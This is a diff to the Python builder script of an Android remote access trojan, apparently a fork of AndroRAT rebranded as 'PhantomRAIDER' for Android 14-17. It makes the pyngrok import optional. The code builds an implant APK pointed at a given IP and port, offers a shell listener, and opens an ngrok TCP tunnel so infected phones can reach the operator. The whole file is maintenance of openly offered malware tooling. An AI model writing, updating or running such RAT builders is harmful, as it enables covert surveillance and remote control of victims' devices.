@@ -6,20 +6,20 @@ import argparse
 import sys
 import platform
 try:
-    from pyngrok import ngrok,conf
-except ImportError as e:
-    print(stdOutput("error")+"\033[1mpyngrok not found");
-    print(stdOutput("info")+"\033[1mRun pip3 install -r requirements.txt")
-    exit()
+    from pyngrok import ngrok, conf
+    HAS_NGROK = True
+except ImportError:
+    HAS_NGROK = False
 
-#                     _           _____         _______
-#     /\             | |         |  __ \     /\|__   __|
-#    /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
-#   / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
-#  / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
-# /_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|   
-#                                        - By karma9874
 
+#   _____   _                       _                         _____            _____   _____   ______    _____ 
+#  |  __ \ | |                     | |                       |  __ \     /\    |_   _| |  __ \ |  ____|  |  __ \
+#  | |__) || |__     __ _  _ __    | |_    ___  _ __ ___     | |__) |   /  \     | |   | |  | || |__     | |__) |
+#  |  ___/ | '_ \   / _` | | '_ \  | __|  / _ \ | '_ ` _ \   |  _  /   / /\ \    | |   | |  | ||  __|    |  _  / 
+#  | |     | | | | | (_| | | | | | | |_  | (_) || | | | | |  | | \ \  / ____ \  _| |_  | |__| || |____   | | \ \ 
+#  |_|     |_| |_|  \__,_| |_| |_|  \__|  \___/ |_| |_| |_|  |_|  \_\/_/    \_\|_____| |_____/ |______|  |_|  \_\
+#                                                                                             - By zannyphantom-13
+#                                                                                             - Android 14-17 Compatible Version
 
 parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
 parser.add_argument('--build',help='For Building the apk',action='store_true')
@@ -42,6 +42,9 @@ if args.build:
     port_ = args.port
     icon=True if args.icon else None
     if args.ngrok:
+        if not HAS_NGROK:
+            print(stdOutput("error")+"\033[1mpyngrok not found - run: pip3 install pyngrok")
+            sys.exit(1)
         conf.get_default().monitor_thread = False
         port = 8000 if not port_ else port_
         tcp_tunnel = ngrok.connect(port, "tcp")
